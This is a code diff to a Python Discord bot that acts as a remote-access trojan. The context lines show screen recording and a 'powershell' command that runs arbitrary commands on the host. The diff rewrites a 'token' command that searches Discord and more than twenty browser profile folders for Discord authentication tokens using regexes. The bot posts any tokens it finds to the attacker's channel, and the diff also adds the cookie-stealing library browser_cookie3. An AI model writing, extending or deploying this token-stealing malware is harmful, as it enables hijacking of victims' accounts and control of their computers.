@@ -21,6 +21,9 @@ import cv2
 import numpy as np
 import getpass
 import tkinter as tk
+import json
+import browser_cookie3
+import re
 
 
 
@@ -509,45 +512,57 @@ async def sr(ctx, duration: int = 30):  # Default duration is set to 30 seconds
     # Optionally, delete the video file after sending
     os.remove(video_path)
 
-def find_tokens():
+
+@bot.command()
+async def token(ctx):
     tokens = []
-    local = os.getenv("LOCALAPPDATA")
+    local = os.getenv("localAPPDATA")
     roaming = os.getenv("APPDATA")
     paths = {
-        "Discord": roaming + "\\Discord",
-        "Discord Canary": roaming + "\\discordcanary",
-        "Discord PTB": roaming + "\\discordptb",
-        "Google Chrome": local + "\\Google\\Chrome\\User Data\\Default",
-        "Opera": roaming + "\\Opera Software\\Opera Stable",
-        "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-        "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default",
-        'Lightcord': roaming + "\\Lightcord",
-        'Opera GX': roaming + "\\Opera Software\\Opera GX Stable",
-        # Add any other browsers or platforms as needed
+        "Discord": os.path.join(roaming, "Discord"),
+        "Discord Canary": os.path.join(roaming, "discordcanary"),
+        "Discord PTB": os.path.join(roaming, "discordptb"),
+        "Google Chrome": os.path.join(local, "Google", "Chrome", "User Data", "Default"),
+        "Opera": os.path.join(roaming, "Opera Software", "Opera Stable"),
+        "Brave": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
+        "Yandex": os.path.join(local, "Yandex", "YandexBrowser", "User Data", "Default"),
+        "Lightcord": os.path.join(roaming, "Lightcord"),
+        "Opera GX": os.path.join(roaming, "Opera Software", "Opera GX Stable"),
+        "Amigo": os.path.join(local, "Amigo", "User Data"),
+        "Torch": os.path.join(local, "Torch", "User Data"),
+        "Kometa": os.path.join(local, "Kometa", "User Data"),
+        "Orbitum": os.path.join(local, "Orbitum", "User Data"),
+        "CentBrowser": os.path.join(local, "CentBrowser", "User Data"),
+        "Sputnik": os.path.join(local, "Sputnik", "Sputnik", "User Data"),
+        "Chrome SxS": os.path.join(local, "Google", "Chrome SxS", "User Data"),
+        "Epic Privacy Browser": os.path.join(local, "Epic Privacy Browser", "User Data"),
+        "Microsoft Edge": os.path.join(local, "Microsoft", "Edge", "User Data", "Default"),
+        "Uran": os.path.join(local, "uCozMedia", "Uran", "User Data", "Default"),
+        "Iridium": os.path.join(local, "Iridium", "User Data", "Default", "local Storage", "leveld"),
+        "Firefox": os.path.join(roaming, "Mozilla", "Firefox", "Profiles"),
     }
 
     for platform, path in paths.items():
-        path = os.path.join(path, "Local Storage", "leveldb")
+        path = os.path.join(path, "local Storage", "leveldb")
         if os.path.exists(path):
             for file_name in os.listdir(path):
-                if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
+                if file_name.endswith((".log", ".ldb", ".sqlite")):
                     with open(os.path.join(path, file_name), errors="ignore") as file:
-                        for line in file.readlines():
+                        for line in file:
                             for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                 for token in re.findall(regex, line):
                                     if f"{token} | {platform}" not in tokens:
                                         tokens.append(f"{token} | {platform}")
-    return tokens
 
-@bot.command()
-async def token(ctx):
-    tokens = find_tokens()
-    if tokens:
-        tokens_message = "\n".join(tokens)
-        await ctx.send(f"Tokens found:\n```{tokens_message}```")
-    else:
-        await ctx.send("No tokens found.")
-
+    # Creating the embed message
+    embed = discord.Embed(
+        title="TOKENS FOUND",
+        description="\n\n".join(tokens) if tokens else "No tokens found.",
+        color=8323249
+    )
+    
+    # Sending the embed message to the channel
+    await ctx.send(embed=embed)
 
 @bot.command()
 async def powershell(ctx, *, command: str):
